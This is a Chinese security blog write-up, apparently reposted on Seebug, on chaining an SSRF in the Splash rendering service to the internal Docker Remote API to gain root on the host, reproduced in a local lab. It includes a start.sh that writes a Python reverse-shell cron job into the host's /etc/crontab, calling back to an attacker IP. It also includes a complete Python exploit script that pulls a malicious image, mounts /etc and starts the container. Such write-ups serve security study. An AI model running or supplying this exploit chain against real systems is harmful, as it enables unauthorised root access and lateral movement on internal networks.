<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>Splash SSRF 到获取内网服务器 ROOT 权限</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">Splash SSRF 到获取内网服务器 ROOT 权限</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-07-17" class="timeago">2 月 之前</time>
          <time datetime="2017-07-17" class="fulldate">七月 17, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/web-security/">Web安全</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p><input type="hidden" class="Authorrss"  value="b1ngzz" name="b1ngzz" /></p>
<p>来源：<a href="https://xianzhi.aliyun.com/forum/read/1872.html">先知安全技术社区</a><br />
作者：<a href="http://weibo.com/u/6004246354?from=feed&amp;loc=at&amp;nick=b1ngzz&amp;is_hot=1#_rnd1500260159459">b1ngzz</a></p>
<h4>0x01 简介</h4>
<p>最近自己写的小工具在扫描的过程，发现了某公司在公网开放了一个使用开源系统的站点，该系统为 Splash，是一个使用 Python3、Twisted 和 QT5 写的 javascript rendering service，即提供了 HTTP API 的轻量级浏览器，默认监听在 8050 (http) 和 5023 (telnet) 端口。</p>
<p>Splash 可以根据用户提供的 url 来渲染页面，并且 url 没有验证，因此可导致 SSRF (带回显)。和一般的  SSRF 不同的是，除了 GET 请求之外，Splash 还支持 POST。这次漏洞利用支持 POST 请求，结合内网 Docker Remote API，获取到了宿主机的 root 权限，最终导致内网漫游。文章整理了一下利用过程，如果有哪里写的不对或者不准确的地方，欢迎大家指出～</p>
<h4>0x02 环境搭建</h4>
<p>为了不涉及公司的内网信息，这里在本地搭建环境，模拟整个过程</p>
<p>画了一个简单的图来描述环境</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/07/1-7.png-w331s" /></p>
<p>这里使用 Virtualbox 运行 Ubuntu 虚拟机作为 Victim，宿主机作为 Attacker</p>
<p>Attacker IP: <code>192.168.1.213</code></p>
<p>Victim:</p>
<p>IP: <code>192.168.1.120</code>  使用桥接模式</p>
<p>内网IP：<code>172.16.10.74</code>，使用 Host-only 并且<strong>在 Adanced 中去掉 Cable Connected</strong></p>
<p>Splash开放在 <code>http://192.168.1.120:8050</code> ，版本为 <code>v2.2.1</code>，Attacker可访问</p>
<p>Docker remote api 在 <code>http://172.16.10.74:2375</code> ，版本为 17.06.0-ce，<strong>Attacker无法访问</strong></p>
<p>JIRA 运行在 <code>http://172.16.10.74:8080</code>，<strong>Attacker 无法访问</strong></p>
<p>Victim 机器上需要装 docker，安装步骤可以参考 文档</p>
<p>因为后面测试需要利用 <code>/etc/crontab</code> 反弹，所以需要启动 cron</p>
<div class="codehilite"><pre><span></span>service cron start
</pre></div>


<p>docker默认安装不会开放 tcp 2375 端口，这里需要修改一下配置，让其监听在 172.16.10.74 的 2375 端口</p>
<p>在 <code>/etc/default/docker</code> 文件中添加</p>
<div class="codehilite"><pre><span></span>DOCKER_OPTS=&quot;-H tcp://172.16.10.74:2375
</pre></div>


<p>创建目录 <code>docker.service.d</code> (如果没有的话)</p>
<div class="codehilite"><pre><span></span>mkdir /etc/systemd/system/docker.service.d/
</pre></div>


<p>修改 <code>vim /etc/systemd/system/docker.service.d/docker.conf</code> 的内容为</p>
<div class="codehilite"><pre><span></span><span class="k">[Service]</span>
<span class="na">ExecStart</span><span class="o">=</span>
<span class="na">EnvironmentFile</span><span class="o">=</span><span class="s">/etc/default/docker</span>
<span class="na">ExecStart</span><span class="o">=</span><span class="s">/usr/bin/dockerd -H fd:// $DOCKER_OPTS</span>
</pre></div>


<p>重启 docker</p>
<div class="codehilite"><pre><span></span>systemctl daemon-reload
service docker restart
</pre></div>


<p>查看是否成功监听</p>
<div class="codehilite"><pre><span></span>root@test:/home/user# netstat -antp | grep LISTEN
tcp        0      0 172.16.10.74:2375       0.0.0.0:*               LISTEN      1531/dockerd   

root@test:/home/user# curl 172.16.10.74:2375
{&quot;message&quot;:&quot;page not found&quot;}
</pre></div>


<p>运行 splash</p>
<div class="codehilite"><pre><span></span>docker pull scrapinghub/splash:2.2.1
sudo docker run --name=splash -d -p 5023:5023 -p 8050:8050 -p 8051:8051 scrapinghub/splash:2.2.1
</pre></div>


<p><img alt="" src="https://images.seebug.org/content/images/2017/07/2-6.png-w331s" /></p>
<p>运行 JIRA</p>
<div class="codehilite"><pre><span></span>docker pull cptactionhank/atlassian-jira:latest
docker run -d -p 172.16.10.74:8080:8080 --name=jira cptactionhank/atlassian-jira:latest
</pre></div>


<p>可以测试一下，宿主机上无法访问以下两个地址的</p>
<div class="codehilite"><pre><span></span># docker remote api
http://192.168.1.120:2375/
# jira
http://192.168.1.120:8080/
</pre></div>


<h4>0x03 利用过程</h4>
<h6>带回显 SSRF</h6>
<p>首先来看一下 SSRF</p>
<p>在宿主机上访问 <code>http://192.168.1.120:8050/</code> ，右上角有一个填写 url 的地方，这里存在带回显的
 ssrf</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/07/3-6.png-w331s" /></p>
<p>这里填写内网 jira 的地址 <code>http://172.16.10.74:8080</code> ，点击 <code>Render me!</code>，可以看到返回了<strong>页面截图、请求信息和页面源码</strong>，相当于是一个内网浏览器!</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/07/4-6.png-w331s" /></p>
<p>查看 文档 得知，有个 <code>render.html</code>  也可以渲染页面，这里访问 docker remote api，<code>http://172.16.10.74:2375</code></p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/07/5-5.png-w331s" /></p>
<h6>Lua scripts 尝试</h6>
<p>阅读了下文档，得知 splash 支持执行自定义的 Lua scripts，也就是首页填写url下面的部分</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/07/6-6.png-w331s" /></p>
<p>具体可以参考这里 <a href="http://splash.readthedocs.io/en/2.2.1/scripting-tutorial.html">Splash Scripts Tutorial</a></p>
<p>但是这里的 Lua 默认是运行在 Sandbox 里，很多标准的 Lua modules 和 functions 都被禁止了</p>
<p>文档 http://splash.readthedocs.io/en/2.2.1/scripting-libs.html#standard-library 列出了 Sandbox 开启后(默认开启)可用的 Lua modules：</p>
<div class="codehilite"><pre><span></span>string
table
math
os
</pre></div>


<p>这里有一个os，可以执行系统命令 http://www.lua.org/manual/5.2/manual.html#pdf-os.execute</p>
<p>但是试了一下 require os，返回 not found，所以没办法实现</p>
<div class="codehilite"><pre><span></span><span class="nx">local</span> <span class="nx">os</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&quot;os&quot;</span><span class="p">)</span>
<span class="kd">function</span> <span class="nx">main</span><span class="p">(</span><span class="nx">splash</span><span class="p">)</span>
<span class="nx">end</span>
</pre></div>


<p><img alt="" src="https://images.seebug.org/content/images/2017/07/7-6.png-w331s" /></p>
<h6>通过 docker remote api 获取宿主机 root 权限</h6>
<p>再看了遍文档，发现除了 <code>GET</code> 请求，还支持 <code>POST</code>，具体可以参考<a href="http://splash.readthedocs.io/en/2.2.1/api.html#render-html">这里</a> </p>
<p>通过之前对该公司的测试，得知某些 ip 段运行着 docker remote api，所以就想尝试利用 post 请求，调用 api，通过挂载宿主机 <code>/etc</code> 目录 ，创建容器，然后写 crontab 来反弹 shell，获取宿主机 root 权限。</p>
<p>根据 docker remote api 的 文档 ，实现反弹需要调用几个 API，分别是</p>
<ol>
<li><code>POST /images/create</code> ：创建image，因为当时的环境可以访问公网，所以就选择将创建好的 image 先push 到 docker hub，然后调用 API 拉取  </li>
<li><code>POST /containers/create</code>: 创建 container，这里需要挂载宿主机 <code>/etc</code> 目录  </li>
<li><code>POST /containers/(id or name)/start</code> : 启动 container，执行将反弹定时任务写入宿主机的 <code>/etc/crontab</code></li>
</ol>
<p>主要说一下构建 image，这里使用了 python 反弹 shell 的方法，代码文件如下</p>
<p>Dockerfile</p>
<div class="codehilite"><pre><span></span>FROM busybox:latest

ADD ./start.sh /start.sh

WORKDIR /
</pre></div>


<p>start.sh：container 启动时运行的脚本，负责写入宿主机 <code>/etc/crontab</code> ，第一个参数作为反弹 host，第二个参数为端口</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="ch">#!/bin/sh</span>

<span class="nb">echo</span> <span class="s2">&quot;* * * * * root python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;</span><span class="nv">$1</span><span class="s2">\&quot;, </span><span class="nv">$2</span><span class="s2">));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;</span> &gt;&gt; /hostdir/crontab
</pre></div>
</td></tr></table>

<p>构建并push</p>
<div class="codehilite"><pre><span></span>docker build -t b1ngz/busybox:latest .
docker push b1ngz/busybox:latest
</pre></div>


<p>虽然 splash 支持 post 请求，但是比较坑的是，文档里没有给向目标地址发 POST 请求的例子，只有参数说明，看了遍文档，关键参数有这几个</p>
<ul>
<li>url : 请求url</li>
<li>http_method：请求url的方法</li>
<li>headers: 请求 headers</li>
<li>body: 请求url的body，默认为 <code>application/x-www-form-urlencoded</code></li>
</ul>
<p>测试的时候，一开始一直使用 get 方法来请求 <code>render.html</code> 接口，但总是返回400 ，卡了很久</p>
<div class="codehilite"><pre><span></span>{
    error: 400,
    description: &quot;Incorrect HTTP API arguments&quot;,
    type: &quot;BadOption&quot;,
    info: {
        argument: &quot;headers&quot;,
        description: &quot;&#39;headers&#39; must be either a JSON array of (name, value) pairs or a JSON object&quot;,
        type: &quot;bad_argument&quot;
    }
}
</pre></div>


<p>搜了一下，在 github issue 里找到了原因，得用post请求，并且 <code>headers</code> 得在 body里，且类型为 json，略坑，这里给出利用脚本，代码有注释，大家可以自己看看</p>
<div class="codehilite"><pre><span></span><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__author__</span> <span class="o">=</span> <span class="s1">&#39;b1ngz&#39;</span>

<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">def</span> <span class="nf">pull_image</span><span class="p">(</span><span class="n">api</span><span class="p">,</span> <span class="n">docker_api</span><span class="p">,</span> <span class="n">image_name</span><span class="p">,</span> <span class="n">image_tag</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;pull image: </span><span class="si">%s</span><span class="s2">:</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">image_name</span><span class="p">,</span> <span class="n">image_tag</span><span class="p">))</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">/render.html&quot;</span> <span class="o">%</span> <span class="n">api</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;url: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">url</span><span class="p">)</span>
    <span class="n">docker_url</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1">/images/create?fromImage=</span><span class="si">%s</span><span class="s1">&amp;tag=</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">docker_api</span><span class="p">,</span> <span class="n">image_name</span><span class="p">,</span> <span class="n">image_tag</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;docker_url: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">docker_url</span><span class="p">)</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">docker_url</span><span class="p">,</span>
        <span class="s1">&#39;http_method&#39;</span><span class="p">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
        <span class="s1">&#39;body&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
        <span class="s1">&#39;timeout&#39;</span><span class="p">:</span> <span class="mi">60</span>
    <span class="p">}</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;request url: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">resp</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;status code: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;resp text: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;-&quot;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">create_container</span><span class="p">(</span><span class="n">api</span><span class="p">,</span> <span class="n">docker_api</span><span class="p">,</span> <span class="n">image_name</span><span class="p">,</span> <span class="n">image_tag</span><span class="p">,</span> <span class="n">shell_host</span><span class="p">,</span> <span class="n">shell_port</span><span class="p">):</span>
    <span class="n">image</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">:</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">image_name</span><span class="p">,</span> <span class="n">image_tag</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;create_container: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">image</span><span class="p">)</span>

    <span class="n">body</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s2">&quot;Image&quot;</span><span class="p">:</span> <span class="n">image</span><span class="p">,</span>
        <span class="s2">&quot;Volumes&quot;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s2">&quot;/etc&quot;</span><span class="p">:</span> <span class="p">{</span>  <span class="c1"># 挂载根目录有时候会出错，这里选择挂载/etc</span>
                <span class="s2">&quot;bind&quot;</span><span class="p">:</span> <span class="s2">&quot;/hostdir&quot;</span><span class="p">,</span>
                <span class="s2">&quot;mode&quot;</span><span class="p">:</span> <span class="s2">&quot;rw&quot;</span>
            <span class="p">}</span>
        <span class="p">},</span>
        <span class="s2">&quot;HostConfig&quot;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s2">&quot;Binds&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;/etc:/hostdir&quot;</span><span class="p">]</span>
        <span class="p">},</span>
        <span class="s2">&quot;Cmd&quot;</span><span class="p">:</span> <span class="p">[</span>  <span class="c1"># 运行 start.sh，将反弹定时任务写入宿主机/etc/crontab</span>
            <span class="s1">&#39;/bin/sh&#39;</span><span class="p">,</span>
            <span class="s1">&#39;/start.sh&#39;</span><span class="p">,</span>
            <span class="n">shell_host</span><span class="p">,</span>
            <span class="nb">str</span><span class="p">(</span><span class="n">shell_port</span><span class="p">),</span>
        <span class="p">],</span>
    <span class="p">}</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">/render.html&quot;</span> <span class="o">%</span> <span class="n">api</span>
    <span class="n">docker_url</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1">/containers/create&#39;</span> <span class="o">%</span> <span class="n">docker_api</span>

    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;http_method&#39;</span><span class="p">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
        <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">docker_url</span><span class="p">,</span>
        <span class="s1">&#39;timeout&#39;</span><span class="p">:</span> <span class="mi">60</span>
    <span class="p">}</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
        <span class="s1">&#39;headers&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">},</span>
        <span class="s2">&quot;body&quot;</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
    <span class="p">})</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;&quot;Id&quot;:&quot;(\w+)&quot;&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">container_id</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">container_id</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;-&quot;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">container_id</span>

<span class="k">def</span> <span class="nf">start_container</span><span class="p">(</span><span class="n">api</span><span class="p">,</span> <span class="n">docker_api</span><span class="p">,</span> <span class="n">container_id</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">/render.html&quot;</span> <span class="o">%</span> <span class="n">api</span>
    <span class="n">docker_url</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1">/containers/</span><span class="si">%s</span><span class="s1">/start&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">docker_api</span><span class="p">,</span> <span class="n">container_id</span><span class="p">)</span>

    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;http_method&#39;</span><span class="p">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
        <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">docker_url</span><span class="p">,</span>
        <span class="s1">&#39;timeout&#39;</span><span class="p">:</span> <span class="mi">10</span>
    <span class="p">}</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
        <span class="s1">&#39;headers&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">},</span>
        <span class="s2">&quot;body&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
    <span class="p">})</span>

    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;-&quot;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_result</span><span class="p">(</span><span class="n">api</span><span class="p">,</span> <span class="n">docker_api</span><span class="p">,</span> <span class="n">container_id</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">/render.html&quot;</span> <span class="o">%</span> <span class="n">api</span>
    <span class="n">docker_url</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%s</span><span class="s1">/containers/</span><span class="si">%s</span><span class="s1">/json&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">docker_api</span><span class="p">,</span> <span class="n">container_id</span><span class="p">)</span>

    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">docker_url</span>
    <span class="p">}</span>

    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
        <span class="s1">&#39;headers&#39;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">},</span>
    <span class="p">})</span>

    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;&quot;ExitCode&quot;:(\w+),&quot;&#39;</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">exit_code</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">exit_code</span> <span class="o">==</span> <span class="s1">&#39;0&#39;</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;success&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;-&quot;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="c1"># splash地址和端口</span>
    <span class="n">splash_host</span> <span class="o">=</span> <span class="s1">&#39;192.168.1.120&#39;</span>
    <span class="n">splash_port</span> <span class="o">=</span> <span class="mi">8050</span>

    <span class="c1"># 内网docker的地址和端口</span>
    <span class="n">docker_host</span> <span class="o">=</span> <span class="s1">&#39;172.16.10.74&#39;</span>
    <span class="n">docker_port</span> <span class="o">=</span> <span class="mi">2375</span>

    <span class="c1"># 反弹shell的地址和端口</span>
    <span class="n">shell_host</span> <span class="o">=</span> <span class="s1">&#39;192.168.1.213&#39;</span>
    <span class="n">shell_port</span> <span class="o">=</span> <span class="mi">12345</span>

    <span class="n">splash_api</span> <span class="o">=</span> <span class="s2">&quot;http://</span><span class="si">%s</span><span class="s2">:</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">splash_host</span><span class="p">,</span> <span class="n">splash_port</span><span class="p">)</span>
    <span class="n">docker_api</span> <span class="o">=</span> <span class="s1">&#39;http://</span><span class="si">%s</span><span class="s1">:</span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">docker_host</span><span class="p">,</span> <span class="n">docker_port</span><span class="p">)</span>

    <span class="c1"># docker image，存在docker hub上</span>
    <span class="n">image_name</span> <span class="o">=</span> <span class="s1">&#39;b1ngz/busybox&#39;</span>
    <span class="n">image_tag</span> <span class="o">=</span> <span class="s1">&#39;latest&#39;</span>

    <span class="c1"># 拉取 image</span>
    <span class="n">pull_image</span><span class="p">(</span><span class="n">splash_api</span><span class="p">,</span> <span class="n">docker_api</span><span class="p">,</span> <span class="n">image_name</span><span class="p">,</span> <span class="n">image_tag</span><span class="p">)</span>
    <span class="c1"># 创建 container</span>
    <span class="n">container_id</span> <span class="o">=</span> <span class="n">create_container</span><span class="p">(</span><span class="n">splash_api</span><span class="p">,</span> <span class="n">docker_api</span><span class="p">,</span> <span class="n">image_name</span><span class="p">,</span> <span class="n">image_tag</span><span class="p">,</span> <span class="n">shell_host</span><span class="p">,</span> <span class="n">shell_port</span><span class="p">)</span>
    <span class="c1"># 启动 container</span>
    <span class="n">start_container</span><span class="p">(</span><span class="n">splash_api</span><span class="p">,</span> <span class="n">docker_api</span><span class="p">,</span> <span class="n">container_id</span><span class="p">)</span>
    <span class="c1"># 获取写入crontab结果</span>
    <span class="n">get_result</span><span class="p">(</span><span class="n">splash_api</span><span class="p">,</span> <span class="n">docker_api</span><span class="p">,</span> <span class="n">container_id</span><span class="p">)</span>
</pre></div>


<h6>其他利用思路</h6>
<p>其他思路的话，首先想到 ssrf 配合 <code>gopher</code> 协议，然后结合内网 redis，因为 splash 是基于 qt 的， 查了一下文档 ，qtwebkit 默认不支持 <code>gopher</code> 协议，所以无法使用 <code>gopher</code> 。</p>
<p>后来经过测试，发现请求 <code>headers</code> 可控 ，并且支持 <code>\n</code> 换行</p>
